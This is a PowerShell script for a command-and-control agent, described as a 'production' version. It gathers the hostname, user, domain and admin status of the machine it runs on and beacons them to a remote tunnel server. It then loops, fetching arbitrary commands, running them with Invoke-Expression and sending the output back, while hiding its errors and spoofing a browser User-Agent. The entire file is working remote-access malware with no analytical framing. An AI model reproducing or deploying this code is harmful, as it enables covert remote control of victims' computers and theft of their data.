# BITS C2 Agent - Production HTTPS Version
# Uses proper SSL via Nginx reverse proxy (no certificate hacks needed)

param(
    [string]$Server = "https://CHANGE-MECHANGE-ME.trycloudflare.com",  # CHANGE THIS
    [string]$ApiKey = "c2-agent-k3y-2024-s3cr3t",
    [int]$Interval = 5
)

$ErrorActionPreference = "SilentlyContinue"

# Generate unique agent ID
$AgentId = "$env:COMPUTERNAME-$env:USERNAME-" + [guid]::NewGuid().ToString().Substring(0,8)
$ServerUrl = "$Server/bits"

function Get-SystemInfo {
    @{
        hostname = $env:COMPUTERNAME
        username = $env:USERNAME
        domain = $env:USERDOMAIN
        os = [System.Environment]::OSVersion.VersionString
        arch = $env:PROCESSOR_ARCHITECTURE
        pid = $PID
        integrity = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
    } | ConvertTo-Json -Compress
}

function Invoke-C2Request {
    param([string]$Uri, [string]$Method = "GET", [string]$Body = $null)
    
    $headers = @{
        "X-API-Key" = $ApiKey
        "X-Agent-ID" = $AgentId
        "Content-Type" = "application/json"
        "User-Agent" = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
    }
    
    try {
        if ($Method -eq "POST" -and $Body) {
            $response = Invoke-RestMethod -Uri $Uri -Method $Method -Headers $headers -Body $Body -TimeoutSec 30
        } else {
            $response = Invoke-RestMethod -Uri $Uri -Method $Method -Headers $headers -TimeoutSec 30
        }
        return $response
    } catch {
        return $null
    }
}

function Send-Result {
    param([string]$Command, [string]$Output, [bool]$Success = $true)
    
    $result = @{
        agent_id = $AgentId
        command = $Command
        output = $Output
        success = $Success
        timestamp = (Get-Date -Format "yyyy-MM-ddTHH:mm:ss")
        system_info = Get-SystemInfo
    } | ConvertTo-Json -Depth 3
    
    Invoke-C2Request -Uri "$ServerUrl/result/$AgentId" -Method "POST" -Body $result
}

# Initial beacon with system info
Write-Host "[*] Agent ID: $AgentId"
Write-Host "[*] Connecting to: $ServerUrl"

$sysInfo = Get-SystemInfo
Send-Result -Command "init" -Output $sysInfo -Success $true
Write-Host "[+] Initial beacon sent"

# Main loop
while ($true) {
    try {
        $cmd = Invoke-C2Request -Uri "$ServerUrl/cmd/$AgentId"
        
        if ($cmd -and $cmd.command -and $cmd.command -ne "none" -and $cmd.command -ne "") {
            Write-Host "[>] Executing: $($cmd.command)"
            
            try {
                # Execute command
                $output = Invoke-Expression $cmd.command 2>&1 | Out-String
                if ([string]::IsNullOrEmpty($output)) { $output = "[OK] Command completed (no output)" }
                Send-Result -Command $cmd.command -Output $output -Success $true
                Write-Host "[+] Result sent"
            } catch {
                Send-Result -Command $cmd.command -Output $_.Exception.Message -Success $false
                Write-Host "[-] Error: $($_.Exception.Message)"
            }
        }
    } catch {
        Write-Host "[-] Connection error, retrying..."
    }
    
    Start-Sleep -Seconds $Interval
}
